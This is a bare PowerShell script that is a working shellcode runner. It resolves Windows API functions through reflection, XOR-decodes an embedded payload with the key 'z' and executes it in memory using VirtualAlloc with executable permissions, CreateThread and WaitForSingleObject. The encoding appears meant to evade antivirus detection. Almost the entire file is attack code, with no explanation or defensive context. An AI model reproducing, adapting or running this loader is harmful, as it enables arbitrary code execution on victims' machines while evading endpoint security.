function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $tmp += $_ } }
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function Invoke-XOR {
    param([byte[]]$buf)
    $z = [byte][char]'z'

    for ($i = 0; $i -lt $buf.Length; $i++) {
        $buf[$i] = $buf[$i] -bxor $z
    }
    return $buf
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run). DefineDynamicModule('InMemoryModule', $false). DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func). SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
[Byte[]] $encbuf = 0x86,0x32,0xf9,0x9e,0x8a,0x92,0xb6,0x7a,0x7a,0x7a,0x3b,0x2b,0x3b,0x2a,0x28,0x2b,0x2c,0x32,0x4b,0xa8,0x1f,0x32,0xf1,0x28,0x1a,0x32,0xf1,0x28,0x62,0x32,0xf1,0x28,0x5a,0x32,0x75,0xcd,0x30,0x30,0x32,0xf1,0x8,0x2a,0x37,0x4b,0xb3,0x32,0x4b,0xba,0xd6,0x46,0x1b,0x6,0x78,0x56,0x5a,0x3b,0xbb,0xb3,0x77,0x3b,0x7b,0xbb,0x98,0x97,0x28,0x32,0xf1,0x28,0x5a,0xf1,0x38,0x46,0x3b,0x2b,0x32,0x7b,0xaa,0x1c,0xfb,0x2,0x62,0x71,0x78,0x75,0xff,0x8,0x7a,0x7a,0x7a,0xf1,0xfa,0xf2,0x7a,0x7a,0x7a,0x32,0xff,0xba,0xe,0x1d,0x32,0x7b,0xaa,0x3e,0xf1,0x3a,0x5a,0xf1,0x32,0x62,0x33,0x7b,0xaa,0x2a,0x99,0x2c,0x32,0x85,0xb3,0x37,0x4b,0xb3,0x3b,0xf1,0x4e,0xf2,0x32,0x7b,0xac,0x32,0x4b,0xba,0x3b,0xbb,0xb3,0x77,0xd6,0x3b,0x7b,0xbb,0x42,0x9a,0xf,0x8b,0x36,0x79,0x36,0x5e,0x72,0x3f,0x43,0xab,0xf,0xa2,0x22,0x3e,0xf1,0x3a,0x5e,0x33,0x7b,0xaa,0x1c,0x3b,0xf1,0x76,0x32,0x3e,0xf1,0x3a,0x66,0x33,0x7b,0xaa,0x3b,0xf1,0x7e,0xf2,0x32,0x7b,0xaa,0x3b,0x22,0x3b,0x22,0x24,0x23,0x20,0x3b,0x22,0x3b,0x23,0x3b,0x20,0x32,0xf9,0x96,0x5a,0x3b,0x28,0x85,0x9a,0x22,0x3b,0x23,0x20,0x32,0xf1,0x68,0x93,0x31,0x85,0x85,0x85,0x27,0x33,0xc4,0xd,0x9,0x48,0x25,0x49,0x48,0x7a,0x7a,0x3b,0x2c,0x33,0xf3,0x9c,0x32,0xfb,0x96,0xda,0x7b,0x7a,0x7a,0x33,0xf3,0x9f,0x33,0xc6,0x78,0x7a,0x5a,0x81,0xba,0xd2,0x57,0xba,0x3b,0x2e,0x33,0xf3,0x9e,0x36,0xf3,0x8b,0x3b,0xc0,0x36,0xd,0x5c,0x7d,0x85,0xaf,0x36,0xf3,0x90,0x12,0x7b,0x7b,0x7a,0x7a,0x23,0x3b,0xc0,0x53,0xfa,0x11,0x7a,0x85,0xaf,0x10,0x70,0x3b,0x24,0x2a,0x2a,0x37,0x4b,0xb3,0x37,0x4b,0xba,0x32,0x85,0xba,0x32,0xf3,0xb8,0x32,0x85,0xba,0x32,0xf3,0xbb,0x3b,0xc0,0x90,0x75,0xa5,0x9a,0x85,0xaf,0x32,0xf3,0xbd,0x10,0x6a,0x3b,0x22,0x36,0xf3,0x98,0x32,0xf3,0x83,0x3b,0xc0,0xe3,0xdf,0xe,0x1b,0x85,0xaf,0xff,0xba,0xe,0x70,0x33,0x85,0xb4,0xf,0x9f,0x92,0xe9,0x7a,0x7a,0x7a,0x32,0xf9,0x96,0x6a,0x32,0xf3,0x98,0x37,0x4b,0xb3,0x10,0x7e,0x3b,0x22,0x32,0xf3,0x83,0x3b,0xc0,0x78,0xa3,0xb2,0x25,0x85,0xaf,0xf9,0x82,0x7a,0x4,0x2f,0x32,0xf9,0xbe,0x5a,0x24,0xf3,0x8c,0x10,0x3a,0x3b,0x23,0x12,0x7a,0x6a,0x7a,0x7a,0x3b,0x22,0x32,0xf3,0x88,0x32,0x4b,0xb3,0x3b,0xc0,0x22,0xde,0x29,0x9f,0x85,0xaf,0x32,0xf3,0xb9,0x33,0xf3,0xbd,0x37,0x4b,0xb3,0x33,0xf3,0x8a,0x32,0xf3,0xa0,0x32,0xf3,0x83,0x3b,0xc0,0x78,0xa3,0xb2,0x25,0x85,0xaf,0xf9,0x82,0x7a,0x7,0x52,0x22,0x3b,0x2d,0x23,0x12,0x7a,0x3a,0x7a,0x7a,0x3b,0x22,0x10,0x7a,0x20,0x3b,0xc0,0x71,0x55,0x75,0x4a,0x85,0xaf,0x2d,0x23,0x3b,0xc0,0xf,0x14,0x37,0x1b,0x85,0xaf,0x33,0x85,0xb4,0x93,0x46,0x85,0x85,0x85,0x32,0x7b,0xb9,0x32,0x53,0xbc,0x32,0xff,0x8c,0xf,0xce,0x3b,0x85,0x9d,0x22,0x10,0x7a,0x23,0xc1,0x9a,0x67,0x50,0x70,0x3b,0xf3,0xa0,0x85,0xaf
[Byte[]] $buf = Invoke-XOR -buf $encbuf

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)